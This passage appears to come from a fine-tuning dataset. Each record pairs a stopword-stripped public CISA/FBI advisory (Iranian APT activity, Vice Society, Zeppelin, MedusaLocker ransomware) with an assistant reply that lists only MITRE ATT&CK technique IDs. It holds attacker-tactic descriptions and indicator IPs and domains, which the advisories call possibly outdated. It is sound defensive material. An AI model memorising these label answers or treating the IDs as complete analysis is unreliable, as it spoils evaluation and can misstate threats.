organizations using microsoft exchange servers fortinet devices andor vmware horizon applications investigate potential suspicious activity networks search iocs collect knownbad iocs search network host artifacts note refer appendix iocs review log4j vulnerabilities including cve202144228 cve202145046 cve2021 45105 review microsoft exchange proxyshell vulnerabilities including cve202134473 cve2021 34523 cve202131207 precaution review additional microsoft exchange vulnerabilities including cve2021 31196 cve202131206 cve202133768 cve202133766 cve202134470 authoring agencies seen actors broadly target microsoft exchange servers investigate exposed microsoft exchange servers patched unpatched compromise review fortinet fortios vulnerabilities including cve201813379 cve202012812 cve20195591 review vmware vulnerabilities including relevant vulnerabilities listed vmware security advisory page investigate changes rdp firewall windows remote management winrm configurations may allow malicious cyber actors maintain persistent access review domain controllers servers workstations active directories new unrecognized user accounts review task scheduler unrecognized scheduled tasks additionally manually review operatingsystem scheduled tasksincluding step tasks performfor unrecognized actions review antivirus logs indications unexpectedly turned look winrar filezilla unexpected locations review servers workstations malicious executable files masquerading legitimate windows processes malicious files may found expected directory may cmdexe powershellexe parent process note additional approaches uncovering malicious cyber activity see joint advisory technical approaches uncovering remediating malicious activity authored cisa cybersecurity authorities australia canada new zealand united kingdom mitigations authoring agencies urge network defenders prepare mitigate potential cyber threats immediately implementing mitigations implement enforce backup restoration policies procedures maintain offline ie physically disconnected backups data regularly test backup restoration practices safeguard organizations continuity operations least minimize potential downtime ransomware destructive data incident protect data losses ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure activate bitlocker networks securely back bitlocker keys microsoft independent offline backup create maintain exercise basic cyber incident response plan includes response procedures ransom incident implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location eg hard drive storage device cloud patch update systems us federal state local tribal territorial sltt government critical infrastructure organizations implement free cisa cyber hygiene services vulnerability scanning enable continuous scans public static ips accessible services vulnerabilities install updatespatch operating systems software firmware soon updatespatches released regularly check software updates endoflife notifications consider leveraging centralized patch management system automate expedite process immediately patch software affected vulnerabilities identified advisory cve2021 34473 cve201813379 cve202012812 cve20195591 cve202134523 cve2021 31207 cve202144228 cve202145046 cve202145105 cve202131196 cve2021 31206 cve202133768 cve202133766 cve202134470 evaluate update blocklists allowlists regularly evaluate update blocklists allowlists fortios used organization add key artifact files used fortios organizations execution blocklist prevent attempts install run program associated files implement network segmentation implement network segmentation restrict malicious threat actors lateral movement secure user accounts audit user accounts administrative privileges configure access controls principles least privilege separation duties require administrator credentials install software implement multifactor authentication use multifactor authentication possible particularly webmail virtual private networks vpns accounts access critical systems privileged accounts manage backups use strong passwords require accounts password logins strong unique passwords see cisa tip choosing protecting passwords national institute standards technology nist special publication 80063b digital identity guidelines information secure monitor rdp potentially risky services use rdp restrict limit access resources internal networks assessing risks organization deems rdp operationally necessary restrict originating sources require mfa mitigate credential theft reuse rdp must available externally use vpn virtual desktop infrastructure means authenticate secure connection allowing rdp connect internal devices disable unused remote accessrdp ports monitor remote accessrdp logs enforce account lockouts specified number attempts block brute force campaigns log rdp login attempts use antivirus programs install regularly update antivirus antimalware software hosts secure remote access use secure networks consider installing using vpn remote access validate security controls addition applying mitigations authoring agencies recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory authoring agencies recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see appendix b align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process authoring agencies recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory responding ransomware extortion incidents ransomware extortion incident occurs organization follow ransomware response checklist page 11 cisamultistate information sharing analysis center msisac joint ransomware guide scan backups possible scan backup data antivirus program check free malware performed using isolated trusted system avoid exposing backups potential compromise follow notification requirements outlined cyber incident response plan us organizations report incidents fbi local fbi field office fbis 247 cywatch 8552923937 cywatchfbigov cisas 247 operations center saycisacisagov calling 1844saycisa 18447292472 us secret service usss usss field office australian organizations visit cybergovau call 1300 292 371 1300 cyber 1 report cybersecurity incidents access alerts advisories canadian organizations report incidents emailing cccs contactcybergcca united kingdom organizations report significant cyber security incident ncscgovukreportanincident monitored 24 hours apply incident response best practices found joint cybersecurity advisory technical approaches uncovering remediating malicious activity developed cisa cybersecurity authorities australia canada new zealand united kingdom note authoring agencies strongly discourage paying ransoms guarantee files records recovered may pose sanctions risks resources us department states rewards justice rfj program offers reward 10 million reports foreign government malicious activity us critical infrastructure see rfj website information report information securely information malicious cyber activity affiliated iranian government sponsored malicious cyber activity see uscertcisagoviran fbis iran threat page information resources protecting responding ransomware extortion activity refer stopransomwaregov us centralized wholeofgovernment webpage providing ransomware resources alerts joint advisory cybersecurity authorities australia canada new zealand united kingdom united states technical approaches uncovering remediating malicious activity provides additional guidance hunting investigating network common mistakes avoid incident handling cisa offers range nocost cyber hygiene services help critical infrastructure organizations assess identify reduce exposure threats requesting services organizations size could find ways reduce risk mitigate malicious activity acsc provide tailored cyber security advice assistance reporting incident response support cybergovau via 1300 292 371 1300 cyber1 purpose advisory developed us australian canadian uk cybersecurity authorities furtherance respective cybersecurity missions including responsibilities develop issue cybersecurity specifications mitigations disclaimer information report provided informational purposes fbi cisa nsa uscccnmf dot acsc cccs ncsc endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring appendix indicators compromise ip addresses executables files listed downloadable copy iocs see aa22 257astix ip addresses 543978148 9521719386 104168117149 107173231114 1447618688 14825171182 17224526118 185141212131 1981265175 19814418974 note observed ip addresses may outdated authoring agencies recommend organizations investigate vet ip addresses prior taking action blocking malicious domains newdesktop symantecserverco msupdateus msupdatetop gupdateus aptmirroreu buylaptop winstoreus tcp443org mssyncone upmirrortop tcp443 subdomain kcp53 subdomain files malicious files observed activity identified table 1 many malicious files masquerading legitimate windows files therefore file names alone treated indicator compromise note additional malicious files observed see joint csa iranian governmentsponsored apt cyber actors exploiting microsoft exchange fortinet vulnerabilities furtherance malicious activities appendix b mitre attck tactics techniques table 2 identifies mitre attck tactics techniques observed activity revisions september 14 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1053.005, T1136.001, T1136.002, T1190, T1486, T1560.001, T1588.001, T1588.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: notethis joint cybersecurity advisory csa part ongoingstopransomwareeffort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources actions take today mitigate cyber threats ransomware prioritize remediateknown exploited vulnerabilities train users recognize report phishing attempts enable enforce multifactor authentication federal bureau investigation fbi cybersecurity infrastructure security agency cisa multistate information sharing analysis center msisac releasing joint csa disseminate iocs ttps associated vice society actors identified fbi investigations recently september 2022 fbi cisa msisac recently observed vice society actors disproportionately targeting education sector ransomware attacks past several years education sector especially kindergarten twelfth grade k12 institutions frequent target ransomware attacks impacts attacks ranged restricted access networks data delayed exams canceled school days unauthorized access theft personal information regarding students staff fbi cisa msisac anticipate attacks may increase 20222023 school year begins criminal ransomware groups perceive opportunities successful attacks school districts limited cybersecurity capabilities constrained resources often vulnerable however opportunistic targeting often seen cyber criminals still put school districts robust cybersecurity programs risk k12 institutions may seen particularly lucrative targets due amount ofsensitive student dataaccessible school systems managed service providers fbi cisa msisac encourage organizations implement recommendations mitigations section csa reduce likelihood impact ransomware incidents download pdf version reportpdf 521 kb download iocsstix 31 kb technical details notethis advisory uses themitre attckfor enterpriseframework version 11 seemitre attck enterprisefor referenced tactics techniques vice society intrusion exfiltration extortion hacking group first appeared summer 2021 vice society actors use ransomware variant unique origin instead actors deployed versions ofhello kittyfive handsandzeppelin ransomware may deploy variants future vice society actors likely obtain initial network access compromised credentials exploiting internetfacing applications prior deploying ransomware actors spend time exploring network identifying opportunities increase accesses exfiltrating data double extortiona tactic whereby actors threaten publicly release sensitive data unless victim pays ransom vice society actors observed using variety tools including systembc powershell empire cobalt strike move laterally also used living land techniques targeting legitimate windows management instrumentation wmi service tainting shared content vice society actors observed exploiting printnightmare vulnerability cve20211675andcve202134527 escalate privileges maintain persistence criminal actors observed leveraging scheduled tasks creating undocumented autostart registry keys pointing legitimate services custom malicious dynamic link libraries dlls tactic known dll sideloading vice society actors attempt evade detection masquerading malware tools legitimate files using process injection likely use evasion techniques defeat automated dynamic analysis vice society actors observed escalating privileges gaining access domain administrator accounts running scripts change passwords victims network accounts prevent victim remediating indicators compromise iocs see table 1 file hashes obtained fbi incident response investigations september 2022 table 1 file hashes september 2022 mitre attck techniques vice society actors used attck techniques similar zeppelin techniques listed table 2 table 2 vice society actors attck techniques enterprise mitigations fbi cisa recommend organizations particularly education sector establish maintain strong liaison relationships fbi field office region regional cisa cybersecurity advisor location contact information fbi field offices cisa regional offices located atwwwfbigovcontactusfieldofficesandwwwcisagovcisaregions respectively partnerships fbi cisa assist identifying vulnerabilities academia mitigating potential threat activity fbi cisa recommend academic entities review needed update incident response communication plans list actions organization take impacted cyber incident fbi cisa msisac recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce risk compromise vice society actors preparing cyber incidents maintain offline backups dataand regularly maintain backup restoration instituting practice organization ensures severely interrupted andor irretrievable data ensure backup data encrypted immutableie altered deleted covers entire organizations data infrastructure ensure backup data already infected review security posture thirdparty vendors interconnected organizationensure connections thirdparty vendors outside software hardware monitored reviewed suspicious activity implement listing policies applications remote access allow systems execute known permitted programsunder established security policy document monitor external remote connectionsorganizations document approved solutions remote management maintenance immediately investigate unapproved solution installed workstation implement recovery planto maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud identity access management require accountswith password logins eg service account admin accounts domain admin accountsto complywithnational institute standards technology nist standardsfor developing managing password policies use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes frequently per year unless password known suspected compromisednotenist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authenticationfor services extent possible particularly webmail virtual private networks accounts access critical systems review domain controllers servers workstations active directoriesfor new andor unrecognized accounts audit user accountswith administrative privileges configure access controls according principle least privilege implement timebased access accounts set admin level higherfor example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task protective controls architecture segment networksto prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring toolto aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host install regularly update enable real time detection antivirus softwareon hosts secure closely monitorremote desktop protocol rdp use limit access resources internal networks especially restricting rdp using virtual desktop infrastructure rdp deemed operationally necessary restrict originating sources require mfa mitigate credential theft reuse rdp must available externally use vpn virtual desktop infrastructure means authenticate secure connection allowing rdp connect internal devices monitor remote accessrdp logs enforce account lockouts specified number attempts block brute force campaigns log rdp login attempts disable unused remote accessrdp ports vulnerability configuration management keep operating systems software firmware datetimely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats organizations prioritize patching vulnerabilities cisasknown exploited vulnerabilitiescatalog disable unusedports consider adding email banner emailsreceived outside organization disable hyperlinksin received emails disable commandline scripting activities permissionsprivilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterally ensure devices properly configured security features enabled disable ports protocols usedfor business purpose eg rdp transmission control protocol port 3389 restrict server message block smb protocol within network access servers necessary remove disable outdated versions smbie smb version 1 threat actors use smb propagate malware across organizations references stopransomwaregovis wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attackcisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene servicescyber hygiene servicesandransomware readiness assessment reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications vice society actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa msisac strongly discourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents alocal fbi field office cisa saycisacisadhsgovor 1844saycisa 18447292472 sltt government entities also report msisac soccisecurityorgor 8667874722 disclaimer information report provided informational purposes fbi cisa msisac endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa msisac revisions september 6 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1047, T1053, T1055, T1068, T1078, T1080, T1190, T1486, T1497, T1531, T1543.003, T1547.001, T1574.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today mitigate cyber threats ransomware prioritize remediateknown exploited vulnerabilities train users recognize report phishing attempts enable enforce multifactor authentication note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa multistate information sharing analysis center msisac releasing joint csa disseminate iocs ttps associated vice society actors identified fbi investigations recently september 2022 fbi cisa msisac recently observed vice society actors disproportionately targeting education sector ransomware attacks past several years education sector especially kindergarten twelfth grade k12 institutions frequent target ransomware attacks impacts attacks ranged restricted access networks data delayed exams canceled school days unauthorized access theft personal information regarding students staff fbi cisa msisac anticipate attacks may increase 20222023 school year begins criminal ransomware groups perceive opportunities successful attacks school districts limited cybersecurity capabilities constrained resources often vulnerable however opportunistic targeting often seen cyber criminals still put school districts robust cybersecurity programs risk k12 institutions may seen particularly lucrative targets due amount sensitive student data accessible school systems managed service providers fbi cisa msisac encourage organizations implement recommendations mitigations section csa reduce likelihood impact ransomware incidents download pdf version report pdf 521 kb download iocs stix 31 kb technical details note advisory uses themitre attck enterpriseframework version 11 see mitre attck enterprisefor referenced tactics techniques vice society intrusion exfiltration extortion hacking group first appeared summer 2021 vice society actors use ransomware variant unique origin instead actors deployed versions hello kittyfive hands zeppelin ransomware may deploy variants future vice society actors likely obtain initial network access compromised credentials exploiting internetfacing applications prior deploying ransomware actors spend time exploring network identifying opportunities increase accesses exfiltrating data double extortiona tactic whereby actors threaten publicly release sensitive data unless victim pays ransom vice society actors observed using variety tools including systembc powershell empire cobalt strike move laterally also used living land techniques targeting legitimate windows management instrumentation wmi service tainting shared content vice society actors observed exploiting printnightmare vulnerability cve20211675 cve202134527 escalate privileges maintain persistence criminal actors observed leveraging scheduled tasks creating undocumented autostart registry keys pointing legitimate services custom malicious dynamic link libraries dlls tactic known dll sideloading vice society actors attempt evade detection masquerading malware tools legitimate files using process injection likely use evasion techniques defeat automated dynamic analysis vice society actors observed escalating privileges gaining access domain administrator accounts running scripts change passwords victims network accounts prevent victim remediating indicators compromise iocs see table 1 file hashes obtained fbi incident response investigations september 2022 table 1 file hashes september 2022 mitre attck techniques vice society actors used attck techniques similar zeppelin techniques listed table 2 table 2 vice society actors attck techniques enterprise mitigations fbi cisa recommend organizations particularly education sector establish maintain strong liaison relationships fbi field office region regional cisa cybersecurity advisor location contact information fbi field offices cisa regional offices located wwwfbigovcontactusfieldoffices wwwcisagovcisaregions respectively partnerships fbi cisa assist identifying vulnerabilities academia mitigating potential threat activity fbi cisa recommend academic entities review needed update incident response communication plans list actions organization take impacted cyber incident fbi cisa msisac recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce risk compromise vice society actors preparing cyber incidents maintain offline backups data regularly maintain backup restoration instituting practice organization ensures severely interrupted andor irretrievable data ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure ensure backup data already infected review security posture thirdparty vendors interconnected organization ensure connections thirdparty vendors outside software hardware monitored reviewed suspicious activity implement listing policies applications remote access allow systems execute known permitted programs established security policy document monitor external remote connections organizations document approved solutions remote management maintenance immediately investigate unapproved solution installed workstation implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud identity access management require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policies use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes frequently per year unless password known suspected compromisednote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systems review domain controllers servers workstations active directories new andor unrecognized accounts audit user accounts administrative privileges configure access controls according principle least privilege implement timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task protective controls architecture segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host install regularly update enable real time detection antivirus software hosts secure closely monitor remote desktop protocol rdp use limit access resources internal networks especially restricting rdp using virtual desktop infrastructure rdp deemed operationally necessary restrict originating sources require mfa mitigate credential theft reuse rdp must available externally use vpn virtual desktop infrastructure means authenticate secure connection allowing rdp connect internal devices monitor remote accessrdp logs enforce account lockouts specified number attempts block brute force campaigns log rdp login attempts disable unused remote accessrdp ports vulnerability configuration management keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats organizations prioritize patching vulnerabilities cisas known exploited vulnerabilities catalog disable unused ports consider adding email banner emails received outside organization disable hyperlinks received emails disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterally ensure devices properly configured security features enabled disable ports protocols used business purpose eg rdp transmission control protocol port 3389 restrict server message block smb protocol within network access servers necessary remove disable outdated versions smb ie smb version 1 threat actors use smb propagate malware across organizations references stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications vice society actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa msisac strongly discourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents alocal fbi field office cisa reportcisagovor calling 1844saycisa 18447292472 sltt government entities also report msisac soccisecurityorg 8667874722 disclaimer information report provided informational purposes fbi cisa msisac endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa msisac revisions september 6 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1036, T1047, T1053, T1055, T1068, T1078, T1080, T1190, T1486, T1497, T1531, T1543.003, T1547.001, T1574.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today mitigate cyber threats ransomware prioritize remediating known exploited vulnerabilities train users recognize report phishing attempts enable enforce multifactor authentication note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa releasing joint csa disseminate known zeppelin ransomware iocs ttps associated ransomware variants identified fbi investigations recently 21 june 2022 fbi cisa encourage organizations implement recommendations mitigations section csa reduce likelihood impact ransomware incidents download pdf version report pdf 999 kb download yara signature zeppelin yara signatureyar 125 kb download iocs stix 113 kb technical details note advisory uses mitre attck enterprise framework version 11 see mitre attck enterprise referenced tactics techniques zeppelin ransomware derivative delphibased vega malware family functions ransomware service raas 2019 least june 2022 actors used malware target wide range businesses critical infrastructure organizations including defense contractors educational institutions manufacturers technology companies especially organizations healthcare medical industries zeppelin actors known request ransom payments bitcoin initial amounts ranging several thousand dollars million dollars zeppelin actors gain access victim networks via rdp exploitation exploiting sonicwall firewall vulnerabilities phishing campaigns prior deploying zeppelin ransomware actors spend one two weeks mapping enumerating victim network identify data enclaves including cloud storage network backups zeppelin actors deploy zeppelin ransomware dll exe file contained within powershell loader1 prior encryption zeppelin actors exfiltrate sensitive company data files sell publish event victim refuses pay ransom ransomware executed randomized ninedigit hexadecimal number appended encrypted file file extension eg filetxttxtc59e0c929 note file ransom note left compromised systems frequently desktop see figure 1 figure 1 sample ransom note fbi observed instances zeppelin actors executed malware multiple times within victims network resulting creation different ids file extensions instance attack results victim needing several unique decryption keys indicators compromise ioc see table 1 iocs june 2022 obtained fbi incident response investigations mitre attck techniques zeppelin actors use attck techniques listed table 2 detection download yara signature zeppelin yara signatureyar 125 kb mitigations fbi cisa recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce risk compromise zeppelin ransomware implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policies use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systems keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching sonicwall firewall vulnerabilities known exploited vulnerabilities internetfacing systems note sonicwall maintains vulnerability list includes advisory id cve mitigation list found psirtglobalsonicwallcomvulnlist segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host install regularly update enable real time detection antivirus software hosts review domain controllers servers workstations active directories new andor unrecognized accounts audit user accounts administrative privileges configure access controls according principle least privilege disable unused ports consider adding email banner emails received outside organization disable hyperlinks received emails implement timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterally maintain offline backups data regularly maintain backup restoration instituting practice organization ensures severely interrupted andor irretrievable data ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications zeppelin actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents local fbi field office cisa uscertcisagovreport us secret service usss usss field office disclaimer information report provided informational purposes cisa fbi endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi references1 zeppelin ransomware steps prepare respond prevent infection coresecuritycom revisions august 11 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1078, T1133, T1190, T1486"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today mitigate cyber threats ransomware prioritize remediating known exploited vulnerabilities train users recognize report phishing attempts enable enforce multifactor authentication note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa department treasury financial crimes enforcement network fincen releasing csa provide information medusalocker ransomware observed recently may 2022 medusalocker actors predominantly rely vulnerabilities remote desktop protocol rdp access victims networks medusalocker actors encrypt victims data leave ransom note communication instructions every folder containing encrypted file note directs victims provide ransomware payments specific bitcoin wallet address medusalocker appears operate ransomwareasaservice raas model based observed split ransom payments typical raas models involve ransomware developer various affiliates deploy ransomware victim systems medusalocker ransomware payments appear consistently split affiliate receives 55 60 percent ransom developer receives remainder download pdf version report pdf 633 kb technical details medusalocker ransomware actors often gain access victim devices vulnerable remote desktop protocol rdp configurations actors also frequently use email phishing spam email campaignsdirectly attaching ransomware emailas initial intrusion vectors medusalocker ransomware uses batch file execute powershell script invokereflectivepeinjection script propagates medusalocker throughout network editing enablelinkedconnections value within infected machines registry allows infected machine detect attached hosts networks via internet control message protocol icmp detect shared storage via server message block smb protocol medusalocker restarts lanmanworkstation service allows registry edits take effect kills processes wellknown security accounting forensic software restarts machine safe mode avoid detection security software encrypts victim files aes256 encryption algorithm resulting key encrypted rsa2048 public key runs every 60 seconds encrypting files except critical functionality victims machine designated encrypted file extension establishes persistence copying executable svhostexe svhosttexe appdataroaming directory scheduling task run ransomware every 15 minutes attempts prevent standard recovery techniques deleting local backups disabling startup recovery options deleting shadow copies medusalocker actors place ransom note every folder containing file victims encrypted data note outlines communicate medusalocker actors typically providing victims one email address actors reached size medusalocker ransom demands appears vary depending victims financial status perceived actors indicators compromise disclaimer many observed ip addresses several years old historically linked medusalocker ransomware recommend ip addresses investigated vetted organizations prior taking action blocking mitre attck techniques medusalocker actors use attck techniques listed table 1 table 1 medusalocker actors attck techniques enterprise mitigations implement recovery plan maintains retains multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud implement network segmentation maintain offline backups data ensure limited interruption organization regularly back data password protect backup copies stored offline ensure copies critical data accessible modification deletion system data resides install regularly update enable real time detection antivirus software hosts install updates operating systems software firmware soon possible review domain controllers servers workstations active directories new andor unrecognized accounts audit user accounts administrative privileges configure access controls according principle least privilege disable unused ports consider adding email banner emails received outside organization disable hyperlinks received emails enforce multifactor authentication mfa use national institute ofstandards technology nist standards developing managing password policies use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes unless evidence password compromisenote nist guidance suggests favoring longer passwords longer requireregular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software use secure networks avoid using public wifi networks consider installing using virtual private network vpn establish secure remote connections focus cybersecurity awareness training regularly provide users training information security principles techniques well overall emerging cybersecurity risks vulnerabilities ransomware phishing scams resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment reporting report incident request technical assistance contact cisa centralcisadhsgov 8882820870 fbi local field office financial institutions must ensure compliance applicable bank secrecy act requirements including suspicious activity reporting obligations indicators compromise iocs suspicious email addresses file names hashes domains ip addresses provided item 44 suspicious activity report sar form information mandatory voluntary reporting cyber events via sars see fincen advisory fin2016a005 advisory financial institutions cyberevents cyberenabled crime october 25 2016 fincen advisory fin2021a004 advisory ransomware use financial system facilitate ransom payments november 8 2021which updates fincen advisory fin2020a006 us department states rewards justice rfj program offers reward 10 million reports foreign government malicious activity us critical infrastructure see rfj website information report information securely contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfieldoffices available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact report incidents anomalous activity request incident response resources technical assistance related threat contact cisa saycisacisadhsgov revisions june 30 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1059.001, T1133, T1486, T1490, T1566"}]}
